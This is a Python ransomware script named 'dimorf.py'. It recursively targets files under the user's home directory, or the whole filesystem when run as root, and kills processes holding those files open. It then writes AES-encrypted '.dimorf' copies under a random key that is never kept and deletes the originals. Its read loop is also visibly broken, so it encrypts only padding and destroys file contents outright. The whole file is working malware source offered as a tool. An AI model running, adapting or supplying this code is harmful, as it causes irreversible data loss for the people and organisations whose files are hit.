#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pylint: skip-file


__author__ = 'Wendel Ortiz -> aKa Ort0x36'
__maintainer__ = 'Wendel Ortiz'
__credits__ = ['Contributors']
__module__ = 'dimorf.py'


import sys
import os
import logging
from datetime import datetime as dt
from psutil import process_iter
from time import sleep
from Crypto.Cipher import AES
from Crypto import Random


def __save_log_error(dir_log: str, logs: list) -> str:
    """ Logs error messages to a file and returns the path of the log file.

    Args:
        dir_log (str): The directory where the log file should be saved.
        logs (list): A list of error messages to be logged.

    Returns:
        str: The path of the log file.

    Raises:
        OSError: If there's an error creating the log directory.
        Exception: If there's an error during the logging process.
        
    """
    try:
        if (
            not (
                os.path.isdir(
                    dir_log
                )
            )
        ):
            os.mkdir(
                dir_log
            )
            
        logging.basicConfig(
            level=logging.INFO,
            filename=f'{dir_log}/{dt.now():%Y-%m-%d}.log',
            format='%(asctime)s - %(levelname)s - %(message)s',
            encoding='utf-8'
        )

        for line in logs:
            logging.error(
                line
            )
        
        return (
            f'\33[32mLogs generated in -> \33[31m{dir_log}/{dt.now():%Y-%m-%d}.log\33[0m'
        )
    
    except Exception as e:
        raise e


def check_os(osname: str) -> bool:
    """ Check if the specified operating system is supported.
    Args:
    osname -- the name of the operating system (string)
    Returns:
    True if the operating system is supported, False otherwise (boolean)
    Raises:
    This function may raise a SystemExit exception if the Python version is not supported.
    """

    PATH = os.getenv('HOME')
    
    if (os.getuid() == 0):
        PATH = '/'
    
    
    # # check if os is linux.
    is_linux = [
        prop for prop in os.uname() if ((prop == "Linux")) and (
            (sys.platform == "linux")) and (
                (os.name == osname))
    ]

    exts = set()
    
    # # get all files extensions from path
    for root, dirs, files in os.walk(PATH):
        for file in files:
            ext = os.path.splitext(file)[1]
            exts.add(ext)
    
    # # sort array        
    exts_list = sorted(
        list(
            exts
        )
    )

    try:
        # # check python version before called function.
        if ((is_linux) and (
            sys.version[0] == '3')
        ):
            find_and_encrypt(
                path=PATH,
                ext_files=exts_list,
                cd=['/bin', '/sbin', '/etc', '/lib', '/usr/lib', '/boot'],
                hidden='.',
                new_ext='.dimorf',
                key=Random.get_random_bytes(32),
                block_bytes=65536,
            )
            
            return True
        
        else:
            return False
    except (OSError, SystemExit):
        sys.exit(
            f'\33[31mUnsupported python version {sys.version_info}, upgrade to python3.\33[0m'
        )
    
    
def find_and_encrypt(
    path: str,
    ext_files: list,
    cd: list,
    hidden: str,
    new_ext: str,
    key: bytes,
    block_bytes: int,
    prev_dirname: str = None
) -> None:
    """
    Recursively searches for files with the specified extensions in the specified path and its subdirectories,
    encrypts them using the AES-CBC algorithm with the specified key and saves them with a new extension.
    Files with the specified names to be hidden are skipped.
    
    Args:
        path (str): The directory path to start the search from.
        ext_files (list): A list of file extensions to be encrypted.
        cd (list): A list of directory names to exclude from the search.
        hidden (str): A string containing the name of files to be hidden.
        new_ext (str): A string with the new extension to be added to the encrypted files.
        key (bytes): The encryption key as bytes.
        block_bytes (int): 
            The size of the block in bytes that the file will be read in, 
            and also the size of the encryption block.
            
    """

    # # go in search of the file.
    for root, dirs, files in os.walk(path):
        if (
            not any(
                root.startswith(c) for c in cd
            )
        ):
            
            dirname = os.path.dirname(root)
                
            for file in files:
                end_with_ext = [
                    ext for ext in ext_files if (
                        file.endswith(
                            ext
                        )
                    )
                ]

                # # verify file type.
                if ((end_with_ext) and not(
                    file.startswith(
                        hidden
                    )
                )):
                    
                    if (root == path):
                        print(
                            f'\33[32mBeginning encryption operations from {root}\33[0m'
                        )
                        prev_dirname = dirname
                    elif (dirname != prev_dirname):
                        sleep(1)
                        print(
                            f'Encrypting files in {dirname}'
                        )
                        prev_dirname = dirname
                    
                    # # checks if the user has permission on the file.
                    if (
                        os.access(
                            os.path.join(
                                root,
                                file
                            ), os.F_OK
                        ) and (
                            os.access(
                                os.path.join(
                                    root,
                                    file
                                ), os.W_OK
                            )
                        ) and (
                            os.access(
                                os.path.join(
                                    root,
                                    file
                                ), os.R_OK
                            )
                        )
                    ):
                        # # kill process
                        for proc in process_iter():
                            try:
                                if proc.open_files():
                                    for f in proc.open_files():
                                        if (
                                            f.path == os.path.join(
                                                root,
                                                file
                                            )
                                        ):
                                            os.kill(proc.pid, 9) # # pid and signal
                            except Exception:
                                pass
                        
                        
                        # # beginning encrypt operations.
                        init_vector = Random.new().read(16)
                        cipher = AES.new(
                            key,
                            AES.MODE_CBC,
                            init_vector
                        )
                        
                        try:
                            # # open and reads file in blocks of 65536 bytes.    
                            with open(os.path.join(root, file), mode='rb') as f:
                                while True:
                                    data = f.read(
                                        block_bytes
                                    )

                                    # # add padding
                                    if len(data) == 0:
                                        data += b'\x00\x01' * (
                                            16 - (
                                                len(
                                                    data
                                                ) % 16
                                            )
                                        )
                                        break
                                    else:
                                        pass

                            # # creates a new one with the same encrypted information
                            # # and adds the modified extension ".dimorf".
                            with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                                f.write(
                                    cipher.encrypt(
                                        data
                                    )
                                )
                            
                            # # remove the original file.
                            os.remove(
                                os.path.join(
                                    root,
                                    file
                                )
                            )
                                                
                        except PermissionError:
                            pass
                    
                    else:
                        try:
                            # # don't have? try assign.
                            os.chmod(
                                os.path.join(
                                    root, 
                                    file
                                ), 0o644
                            )
                            
                            try:
                                # # beginning encrypt operations.
                                init_vector = Random.new().read(16)
                                cipher = AES.new(
                                    key,
                                    AES.MODE_CBC,
                                    init_vector
                                )
                                
                                # # open and reads file in blocks of 65536 bytes.    
                                with open(os.path.join(root, file), mode='rb') as f:
                                    while True:
                                        data = f.read(
                                            block_bytes
                                        )

                                        # # add padding
                                        if len(data) == 0:
                                            data += b'\x00\x01' * (
                                                16 - (
                                                    len(
                                                        data
                                                    ) % 16
                                                )
                                            )
                                            break
                                        else:
                                            pass
                                    
                                # # creates a new one with the same encrypted information
                                # # and adds the modified extension ".dimorf".
                                with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                                    f.write(
                                        cipher.encrypt(
                                            data
                                        )
                                    )
                                                        
                                # # remove the original file.
                                os.remove(
                                    os.path.join(
                                        root,
                                        file
                                    )
                                )
                            
                            except PermissionError:
                                pass
                        
                        except PermissionError:
                            
                            # # generates a log file with the files
                            # # that could not be assigned permission.
                            sleep(1)
                            
                            # # print to get return of logging function 
                            print(
                                __save_log_error(
                                    dir_log='./log_dimorf',
                                    logs=[
                                        ('Error changing file permissions\n'),
                                        (f'Files not encrypted by unauthorized operations. => {os.path.join(root, file)}\n')
                                    ]
                                )
                            )
                                
                
if __name__ == '__main__':
    os.system('clear')        
    check_os('posix')
